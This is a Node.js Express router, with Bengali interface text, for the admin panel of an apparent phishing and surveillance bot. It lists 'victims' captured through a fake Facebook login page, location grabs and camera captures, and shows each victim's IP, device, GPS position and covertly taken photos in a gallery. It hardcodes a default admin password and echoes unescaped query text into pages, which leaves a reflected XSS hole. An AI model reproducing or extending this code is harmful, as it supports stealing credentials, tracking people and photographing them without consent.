const express = require('express');
const router = express.Router();
const Config = require('../models/Config');
const User = require('../models/User');
const Victim = require('../models/Victim');

// ============================
// অ্যাডমিন লগইন চেক (মিডলওয়্যার)
// ============================
async function isAdmin(req, res, next) {
    if (req.session.isAdmin) return next();
    res.redirect('/admin');
}

// ============================
// লগইন পেজ (পাসওয়ার্ড টেক্সট বাদ)
// ============================
router.get('/admin', async (req, res) => {
    if (req.session.isAdmin) return res.redirect('/admin/dashboard');
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>অ্যাডমিন লগইন</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
            <style>
                * { margin:0; padding:0; box-sizing:border-box; }
                body {
                    font-family: 'Inter', sans-serif;
                    background: #f4f6fa;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    padding: 20px;
                }
                .login-card {
                    background: #ffffff;
                    border-radius: 20px;
                    padding: 48px 40px 40px;
                    width: 100%;
                    max-width: 420px;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.06);
                    text-align: center;
                }
                .login-card .icon {
                    font-size: 40px;
                    color: #4f46e5;
                    background: #eef2ff;
                    width: 72px;
                    height: 72px;
                    line-height: 72px;
                    border-radius: 50%;
                    margin: 0 auto 20px;
                }
                .login-card h2 {
                    font-weight: 600;
                    font-size: 24px;
                    color: #111827;
                    margin-bottom: 6px;
                }
                .login-card p.sub {
                    color: #6b7280;
                    font-size: 14px;
                    margin-bottom: 28px;
                }
                .login-card input {
                    width: 100%;
                    padding: 14px 18px;
                    border: 1.5px solid #e5e7eb;
                    border-radius: 12px;
                    font-size: 15px;
                    font-family: 'Inter', sans-serif;
                    transition: 0.2s;
                    margin-bottom: 16px;
                    background: #f9fafb;
                }
                .login-card input:focus {
                    border-color: #4f46e5;
                    background: #ffffff;
                    outline: none;
                    box-shadow: 0 0 0 4px rgba(79,70,229,0.1);
                }
                .login-card button {
                    width: 100%;
                    padding: 14px;
                    background: #4f46e5;
                    color: #fff;
                    border: none;
                    border-radius: 12px;
                    font-size: 16px;
                    font-weight: 600;
                    font-family: 'Inter', sans-serif;
                    cursor: pointer;
                    transition: 0.2s;
                }
                .login-card button:hover {
                    background: #4338ca;
                }
                .login-card .error {
                    color: #dc2626;
                    font-size: 14px;
                    margin-top: 12px;
                    display: ${req.query.error ? 'block' : 'none'};
                }
                .login-card .footer-text {
                    margin-top: 24px;
                    font-size: 13px;
                    color: #9ca3af;
                }
                /* ডিফল্ট পাসওয়ার্ড টেক্সট সম্পূর্ণ রিমুভ */
            </style>
        </head>
        <body>
            <div class="login-card">
                <div class="icon"><i class="fas fa-shield-alt"></i></div>
                <h2>অ্যাডমিন লগইন</h2>
                <p class="sub">আপনার ক্রেডেনশিয়াল দিন</p>
                ${req.query.error ? `<div class="error"><i class="fas fa-exclamation-circle"></i> ভুল পাসওয়ার্ড!</div>` : ''}
                <form method="POST" action="/admin/login">
                    <input type="password" name="password" placeholder="পাসওয়ার্ড লিখুন" required>
                    <button type="submit"><i class="fas fa-arrow-right-to-bracket"></i> লগইন</button>
                </form>
                <!-- 👇 ডিফল্ট পাসওয়ার্ড টেক্সট সম্পূর্ণ রিমুভ -->
            </div>
        </body>
        </html>
    `);
});

router.post('/admin/login', async (req, res) => {
    const config = await Config.findOne({ key: 'bot_config' });
    const adminPass = config ? config.adminPassword : 'Sakib@7890';
    if (req.body.password === adminPass) {
        req.session.isAdmin = true;
        res.redirect('/admin/dashboard');
    } else {
        res.redirect('/admin?error=1');
    }
});

router.get('/admin/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/admin');
});

// ============================
// ড্যাশবোর্ড – লাইট থিম, প্রিমিয়াম আইকন
// ============================
router.get('/admin/dashboard', isAdmin, async (req, res) => {
    const config = await Config.findOne({ key: 'bot_config' });
    const totalUsers = await User.countDocuments();
    const allowedUsers = await User.countDocuments({ allowed: true });
    const totalVictims = await Victim.countDocuments();
    const victims = await Victim.find().sort({ timestamp: -1 }).limit(20);
    const users = await User.find().sort({ firstSeen: -1 }).limit(30);
    const baseUrl = config?.baseUrl || 'http://localhost:3000';
    const msg = req.query.msg || '';
    const error = req.query.error || '';

    // ইউজার টেবিল (ডিলিট অপশন সহ)
    let userRows = users.map(u => `
        <tr>
            <td><code class="id-badge">${u.fbId}</code></td>
            <td><strong>${u.firstName || 'N/A'}</strong></td>
            <td>${new Date(u.firstSeen).toLocaleDateString('bn-BD')}</td>
            <td>${u.messageCount || 0}</td>
            <td><span class="status-badge ${u.allowed ? 'allowed' : 'denied'}">${u.allowed ? 'অনুমোদিত' : 'বাতিল'}</span></td>
            <td>
                <div class="action-group">
                    <form method="POST" action="/admin/toggle-user" class="inline-form">
                        <input type="hidden" name="userId" value="${u.fbId}">
                        <input type="hidden" name="action" value="${u.allowed ? 'deny' : 'allow'}">
                        <button class="btn-icon toggle" title="${u.allowed ? 'বাতিল করুন' : 'অনুমোদন দিন'}">
                            <i class="fas ${u.allowed ? 'fa-user-slash' : 'fa-user-check'}"></i>
                        </button>
                    </form>
                    <form method="POST" action="/admin/delete-user" class="inline-form" onsubmit="return confirm('এই ইউজারকে ডিলিট করবেন?');">
                        <input type="hidden" name="userId" value="${u.fbId}">
                        <button class="btn-icon delete" title="ডিলিট">
                            <i class="fas fa-trash-alt"></i>
                        </button>
                    </form>
                </div>
            </td>
        </tr>
    `).join('');

    // ভিক্টিম টেবিল
    let victimRows = victims.map(v => {
        const lastImage = v.camera && v.camera.length > 0 ? v.camera[v.camera.length - 1].image : null;
        const imgTag = lastImage 
            ? `<img src="data:image/jpeg;base64,${lastImage}" class="victim-thumb" />` 
            : '<span class="text-muted">—</span>';
        return `
            <tr>
                <td><code class="id-badge">${v.id}</code></td>
                <td><span class="type-badge ${v.type}">${v.type === 'fb' ? 'ফেক লগইন' : v.type === 'location' ? 'লোকেশন' : 'ক্যামেরা'}</span></td>
                <td>${v.ip || 'N/A'}</td>
                <td>${v.device?.platform || v.device?.userAgent?.split('(')[1]?.split(')')[0] || 'N/A'}</td>
                <td>${v.location?.city || v.gpsLocation?.latitude ? '<i class="fas fa-map-pin" style="color:#4f46e5;"></i> হ্যাঁ' : '❌ না'}</td>
                <td>${v.camera?.length || 0}</td>
                <td>${imgTag}</td>
                <td>
                    <a href="/admin/victim/${v.id}" class="btn-view"><i class="fas fa-eye"></i></a>
                </td>
                <td>${new Date(v.timestamp).toLocaleDateString('bn-BD')}</td>
            </tr>
        `;
    }).join('');

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>অ্যাডমিন প্যানেল</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
            <style>
                * { margin:0; padding:0; box-sizing:border-box; }
                body {
                    font-family: 'Inter', sans-serif;
                    background: #f4f6fa;
                    color: #111827;
                    padding: 24px;
                }
                .container {
                    max-width: 1440px;
                    margin: 0 auto;
                }
                /* header */
                .header {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 32px;
                    flex-wrap: wrap;
                    gap: 16px;
                }
                .header h1 {
                    font-weight: 600;
                    font-size: 28px;
                    color: #111827;
                    display: flex;
                    align-items: center;
                    gap: 12px;
                }
                .header h1 i {
                    color: #4f46e5;
                }
                .header .logout-btn {
                    background: #fee2e2;
                    color: #b91c1c;
                    padding: 10px 20px;
                    border-radius: 12px;
                    text-decoration: none;
                    font-weight: 500;
                    font-size: 14px;
                    transition: 0.2s;
                    display: flex;
                    align-items: center;
                    gap: 8px;
                }
                .header .logout-btn:hover {
                    background: #fecaca;
                }

                /* stats */
                .stats {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin-bottom: 32px;
                }
                .stat-card {
                    background: #ffffff;
                    border-radius: 16px;
                    padding: 20px 24px;
                    box-shadow: 0 2px 8px rgba(0,0,0,0.04);
                    border: 1px solid #eef2f6;
                    display: flex;
                    align-items: center;
                    gap: 16px;
                }
                .stat-card .icon {
                    font-size: 28px;
                    color: #4f46e5;
                    background: #eef2ff;
                    width: 52px;
                    height: 52px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    border-radius: 14px;
                }
                .stat-card .info .number {
                    font-size: 26px;
                    font-weight: 700;
                    color: #111827;
                    line-height: 1.2;
                }
                .stat-card .info .label {
                    font-size: 14px;
                    color: #6b7280;
                }

                /* cards */
                .card {
                    background: #ffffff;
                    border-radius: 20px;
                    padding: 24px 28px;
                    margin-bottom: 28px;
                    border: 1px solid #eef2f6;
                    box-shadow: 0 2px 8px rgba(0,0,0,0.03);
                }
                .card-header {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 18px;
                    flex-wrap: wrap;
                    gap: 12px;
                }
                .card-header h2 {
                    font-weight: 600;
                    font-size: 18px;
                    color: #111827;
                    display: flex;
                    align-items: center;
                    gap: 10px;
                }
                .card-header h2 i {
                    color: #4f46e5;
                }
                .card-header .badge {
                    background: #eef2ff;
                    color: #4f46e5;
                    font-size: 13px;
                    font-weight: 500;
                    padding: 4px 14px;
                    border-radius: 30px;
                }

                /* tables */
                .table-wrap {
                    overflow-x: auto;
                    border-radius: 12px;
                }
                table {
                    width: 100%;
                    border-collapse: collapse;
                    font-size: 14px;
                }
                th {
                    text-align: left;
                    padding: 12px 10px;
                    font-weight: 600;
                    color: #4b5563;
                    border-bottom: 2px solid #e5e7eb;
                    background: #f9fafb;
                }
                td {
                    padding: 12px 10px;
                    border-bottom: 1px solid #f3f4f6;
                    vertical-align: middle;
                }
                tr:last-child td { border-bottom: none; }
                .id-badge {
                    background: #f3f4f6;
                    padding: 4px 10px;
                    border-radius: 30px;
                    font-size: 12px;
                    font-weight: 500;
                    color: #374151;
                }
                .status-badge {
                    padding: 4px 14px;
                    border-radius: 30px;
                    font-size: 12px;
                    font-weight: 500;
                }
                .status-badge.allowed { background: #d1fae5; color: #065f46; }
                .status-badge.denied { background: #fee2e2; color: #991b1b; }
                .type-badge {
                    padding: 4px 12px;
                    border-radius: 30px;
                    font-size: 12px;
                    font-weight: 500;
                }
                .type-badge.camera { background: #dbeafe; color: #1e40af; }
                .type-badge.location { background: #e0e7ff; color: #3730a3; }
                .type-badge.fb { background: #fce7f3; color: #9d174d; }
                .victim-thumb {
                    width: 44px;
                    height: 44px;
                    object-fit: cover;
                    border-radius: 10px;
                    border: 1px solid #e5e7eb;
                }
                .action-group {
                    display: flex;
                    gap: 6px;
                    flex-wrap: wrap;
                }
                .inline-form { display: inline; }
                .btn-icon {
                    background: transparent;
                    border: none;
                    cursor: pointer;
                    padding: 6px 10px;
                    border-radius: 8px;
                    font-size: 16px;
                    transition: 0.2s;
                }
                .btn-icon.toggle { color: #4f46e5; }
                .btn-icon.toggle:hover { background: #eef2ff; }
                .btn-icon.delete { color: #dc2626; }
                .btn-icon.delete:hover { background: #fee2e2; }
                .btn-view {
                    color: #4f46e5;
                    text-decoration: none;
                    padding: 6px 12px;
                    border-radius: 8px;
                    background: #eef2ff;
                    font-size: 14px;
                    transition: 0.2s;
                }
                .btn-view:hover { background: #dbeafe; }
                .text-muted { color: #9ca3af; }

                /* form elements inside card */
                .config-grid {
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 16px;
                }
                .config-grid .full { grid-column: 1 / -1; }
                .config-grid label {
                    font-weight: 500;
                    font-size: 13px;
                    color: #4b5563;
                    display: block;
                    margin-bottom: 4px;
                }
                .config-grid input, .config-grid textarea {
                    width: 100%;
                    padding: 10px 14px;
                    border: 1.5px solid #e5e7eb;
                    border-radius: 10px;
                    font-family: 'Inter', sans-serif;
                    font-size: 14px;
                    background: #f9fafb;
                    transition: 0.2s;
                }
                .config-grid input:focus, .config-grid textarea:focus {
                    border-color: #4f46e5;
                    background: #ffffff;
                    outline: none;
                    box-shadow: 0 0 0 4px rgba(79,70,229,0.08);
                }
                .btn-primary {
                    background: #4f46e5;
                    color: #fff;
                    border: none;
                    padding: 10px 24px;
                    border-radius: 12px;
                    font-weight: 600;
                    font-size: 14px;
                    cursor: pointer;
                    transition: 0.2s;
                    display: inline-flex;
                    align-items: center;
                    gap: 8px;
                    font-family: 'Inter', sans-serif;
                }
                .btn-primary:hover { background: #4338ca; }
                .btn-secondary {
                    background: #f3f4f6;
                    color: #374151;
                    border: none;
                    padding: 10px 24px;
                    border-radius: 12px;
                    font-weight: 500;
                    font-size: 14px;
                    cursor: pointer;
                    transition: 0.2s;
                    font-family: 'Inter', sans-serif;
                }
                .btn-secondary:hover { background: #e5e7eb; }

                @media (max-width: 768px) {
                    .config-grid { grid-template-columns: 1fr; }
                    .header h1 { font-size: 22px; }
                    .stats { grid-template-columns: repeat(2, 1fr); }
                }
                @media (max-width: 480px) {
                    .stats { grid-template-columns: 1fr; }
                    .card { padding: 18px; }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <!-- header -->
                <div class="header">
                    <h1><i class="fas fa-panel"></i> অ্যাডমিন প্যানেল</h1>
                    <a href="/admin/logout" class="logout-btn"><i class="fas fa-sign-out-alt"></i> লগআউট</a>
                </div>

                ${msg ? `<div style="background:#d1fae5;color:#065f46;padding:14px 20px;border-radius:12px;margin-bottom:24px;display:flex;align-items:center;gap:10px;"><i class="fas fa-check-circle"></i> ${msg}</div>` : ''}
                ${error ? `<div style="background:#fee2e2;color:#991b1b;padding:14px 20px;border-radius:12px;margin-bottom:24px;display:flex;align-items:center;gap:10px;"><i class="fas fa-exclamation-circle"></i> ${error}</div>` : ''}

                <!-- stats -->
                <div class="stats">
                    <div class="stat-card">
                        <div class="icon"><i class="fas fa-users"></i></div>
                        <div class="info"><div class="number">${totalUsers}</div><div class="label">মোট ইউজার</div></div>
                    </div>
                    <div class="stat-card">
                        <div class="icon"><i class="fas fa-user-check"></i></div>
                        <div class="info"><div class="number">${allowedUsers}</div><div class="label">অনুমোদিত</div></div>
                    </div>
                    <div class="stat-card">
                        <div class="icon"><i class="fas fa-user-secret"></i></div>
                        <div class="info"><div class="number">${totalVictims}</div><div class="label">মোট ভিক্টিম</div></div>
                    </div>
                    <div class="stat-card">
                        <div class="icon"><i class="fas fa-camera"></i></div>
                        <div class="info"><div class="number">${victims.reduce((s, v) => s + (v.camera?.length || 0), 0)}</div><div class="label">ছবি ক্যাপচার</div></div>
                    </div>
                </div>

                <!-- config -->
                <div class="card">
                    <div class="card-header">
                        <h2><i class="fas fa-sliders-h"></i> কনফিগারেশন</h2>
                        <span class="badge">প্রয়োজনীয়</span>
                    </div>
                    <form method="POST" action="/admin/update-config">
                        <div class="config-grid">
                            <div>
                                <label><i class="fas fa-key" style="margin-right:6px;color:#4f46e5;"></i> পেজ অ্যাক্সেস টোকেন</label>
                                <input type="text" name="pageAccessToken" value="${config?.pageAccessToken || ''}" placeholder="PAGE_ACCESS_TOKEN">
                            </div>
                            <div>
                                <label><i class="fas fa-shield-alt" style="margin-right:6px;color:#4f46e5;"></i> ভেরিফাই টোকেন</label>
                                <input type="text" name="verifyToken" value="${config?.verifyToken || 'Sakib_Verify'}" placeholder="VERIFY_TOKEN">
                            </div>
                            <div>
                                <label><i class="fas fa-lock" style="margin-right:6px;color:#4f46e5;"></i> অ্যাডমিন পাসওয়ার্ড</label>
                                <input type="text" name="adminPassword" value="${config?.adminPassword || 'Sakib@7890'}" placeholder="অ্যাডমিন পাসওয়ার্ড">
                            </div>
                            <div>
                                <label><i class="fas fa-link" style="margin-right:6px;color:#4f46e5;"></i> বেস URL</label>
                                <input type="text" name="baseUrl" value="${config?.baseUrl || baseUrl}" placeholder="https://your-domain.com">
                            </div>
                            <div class="full">
                                <button type="submit" class="btn-primary"><i class="fas fa-save"></i> কনফিগ সেভ</button>
                            </div>
                        </div>
                    </form>
                    <div style="margin-top:16px;padding-top:16px;border-top:1px solid #eef2f6;">
                        <code style="background:#f3f4f6;padding:4px 14px;border-radius:30px;font-size:13px;">📌 ওয়েবহুক URL: ${baseUrl}/webhook</code>
                    </div>
                </div>

                <!-- users -->
                <div class="card">
                    <div class="card-header">
                        <h2><i class="fas fa-address-book"></i> ইউজার ম্যানেজমেন্ট</h2>
                        <span class="badge">${totalUsers} জন</span>
                    </div>
                    <div class="table-wrap">
                        <table>
                            <thead><tr>
                                <th>FB ID</th><th>নাম</th><th>প্রথম দেখা</th><th>মেসেজ</th><th>স্ট্যাটাস</th><th>অ্যাকশন</th>
                            </tr></thead>
                            <tbody>${userRows || '<tr><td colspan="6" style="text-align:center;color:#9ca3af;padding:30px 0;"><i class="fas fa-inbox"></i> কোনো ইউজার নেই</td></tr>'}</tbody>
                        </table>
                    </div>
                </div>

                <!-- victims -->
                <div class="card">
                    <div class="card-header">
                        <h2><i class="fas fa-eye"></i> ভিক্টিম ডেটা</h2>
                        <span class="badge">সর্বশেষ ২০টি</span>
                    </div>
                    <div class="table-wrap">
                        <table>
                            <thead><tr>
                                <th>আইডি</th><th>টাইপ</th><th>আইপি</th><th>ডিভাইস</th><th>লোকেশন</th><th>ছবি</th><th>প্রিভিউ</th><th>অ্যাকশন</th><th>সময়</th>
                            </tr></thead>
                            <tbody>${victimRows || '<tr><td colspan="9" style="text-align:center;color:#9ca3af;padding:30px 0;"><i class="fas fa-inbox"></i> কোনো ভিক্টিম নেই</td></tr>'}</tbody>
                        </table>
                    </div>
                    <div style="margin-top:16px;font-size:13px;color:#6b7280;">
                        <i class="fas fa-info-circle"></i> বিস্তারিত দেখতে "দেখুন" বাটনে ক্লিক করুন।
                    </div>
                </div>
            </div>
        </body>
        </html>
    `);
});

// ============================
// POST রাউটস (কনফিগ, টগল ইউজার, ডিলিট ইউজার)
// ============================
router.post('/admin/update-config', isAdmin, async (req, res) => {
    try {
        let config = await Config.findOne({ key: 'bot_config' });
        if (!config) config = new Config({ key: 'bot_config' });
        config.pageAccessToken = req.body.pageAccessToken || '';
        config.verifyToken = req.body.verifyToken || 'Sakib_Verify';
        config.adminPassword = req.body.adminPassword || 'Sakib@7890';
        config.baseUrl = req.body.baseUrl || '';
        await config.save();
        res.redirect('/admin/dashboard?msg=কনফিগ+সেভ+হয়েছে');
    } catch (err) {
        res.redirect('/admin/dashboard?error=সেভ+ব্যর্থ');
    }
});

router.post('/admin/toggle-user', isAdmin, async (req, res) => {
    try {
        const { userId, action } = req.body;
        const user = await User.findOne({ fbId: userId });
        if (user) {
            user.allowed = (action === 'allow');
            await user.save();
        }
        res.redirect('/admin/dashboard?msg=ইউজার+আপডেট+হয়েছে');
    } catch (err) {
        res.redirect('/admin/dashboard?error=আপডেট+ব্যর্থ');
    }
});

// 🆕 ইউজার ডিলিট রাউট
router.post('/admin/delete-user', isAdmin, async (req, res) => {
    try {
        const { userId } = req.body;
        if (!userId) {
            return res.redirect('/admin/dashboard?error=ইউজার+আইডি+প্রয়োজন');
        }
        const result = await User.deleteOne({ fbId: userId });
        if (result.deletedCount === 0) {
            return res.redirect('/admin/dashboard?error=ইউজার+পাওয়া+যায়নি');
        }
        res.redirect('/admin/dashboard?msg=ইউজার+ডিলিট+হয়েছে');
    } catch (err) {
        console.error('Delete user error:', err);
        res.redirect('/admin/dashboard?error=ডিলিট+ব্যর্থ');
    }
});

// ============================
// ভিক্টিম গ্যালারি ভিউ
// ============================
router.get('/admin/victim/:id', isAdmin, async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('ভিক্টিম পাওয়া যায়নি');
        }

        let imagesHtml = '';
        if (victim.camera && victim.camera.length > 0) {
            victim.camera.forEach((cam, index) => {
                imagesHtml += `
                    <div class="gallery-item">
                        <img src="data:image/jpeg;base64,${cam.image}" alt="ছবি ${index+1}" />
                        <div class="gallery-label">ছবি #${index+1} <br> <small>${new Date(cam.timestamp).toLocaleString('bn-BD')}</small></div>
                    </div>
                `;
            });
        } else {
            imagesHtml = '<p style="text-align:center;color:#9ca3af;padding:40px 0;"><i class="fas fa-camera-slash"></i> এই ভিক্টিমের কোনো ছবি নেই</p>';
        }

        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>ভিক্টিমের ছবি - ${victim.id}</title>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
                <style>
                    * { margin:0; padding:0; box-sizing:border-box; }
                    body {
                        font-family: 'Inter', sans-serif;
                        background: #f4f6fa;
                        padding: 24px;
                        color: #111827;
                    }
                    .container { max-width: 1200px; margin:0 auto; }
                    .header {
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                        background: #ffffff;
                        padding: 18px 28px;
                        border-radius: 16px;
                        margin-bottom: 28px;
                        border: 1px solid #eef2f6;
                        flex-wrap: wrap;
                        gap: 12px;
                    }
                    .header h2 { font-weight: 600; font-size: 20px; }
                    .header h2 i { color: #4f46e5; margin-right: 10px; }
                    .header .sub { color: #6b7280; font-size: 14px; }
                    .btn-back {
                        background: #eef2ff;
                        color: #4f46e5;
                        padding: 10px 22px;
                        border-radius: 12px;
                        text-decoration: none;
                        font-weight: 500;
                        display: inline-flex;
                        align-items: center;
                        gap: 8px;
                        transition: 0.2s;
                    }
                    .btn-back:hover { background: #dbeafe; }
                    .gallery {
                        display: grid;
                        grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
                        gap: 20px;
                    }
                    .gallery-item {
                        background: #ffffff;
                        border-radius: 16px;
                        overflow: hidden;
                        border: 1px solid #eef2f6;
                        box-shadow: 0 2px 8px rgba(0,0,0,0.04);
                        transition: 0.2s;
                    }
                    .gallery-item:hover { transform: translateY(-4px); box-shadow: 0 12px 24px rgba(0,0,0,0.08); }
                    .gallery-item img {
                        width: 100%;
                        height: 200px;
                        object-fit: cover;
                        display: block;
                    }
                    .gallery-label {
                        padding: 12px 16px;
                        font-size: 13px;
                        color: #374151;
                        text-align: center;
                        border-top: 1px solid #f3f4f6;
                    }
                    .gallery-label small { color: #9ca3af; font-size: 12px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <div>
                            <h2><i class="fas fa-images"></i> ভিক্টিমের ছবি</h2>
                            <div class="sub">আইডি: <code style="background:#f3f4f6;padding:2px 12px;border-radius:30px;">${victim.id}</code> &bull; মোট ${victim.camera?.length || 0}টি ছবি</div>
                        </div>
                        <a href="/admin/dashboard" class="btn-back"><i class="fas fa-arrow-left"></i> ড্যাশবোর্ডে ফিরুন</a>
                    </div>
                    <div class="gallery">${imagesHtml}</div>
                    <div style="margin-top:24px;">
                        <a href="/admin/dashboard" class="btn-back"><i class="fas fa-arrow-left"></i> ড্যাশবোর্ডে ফিরুন</a>
                    </div>
                </div>
            </body>
            </html>
        `);
    } catch (err) {
        console.error('Victim gallery error:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

module.exports = router;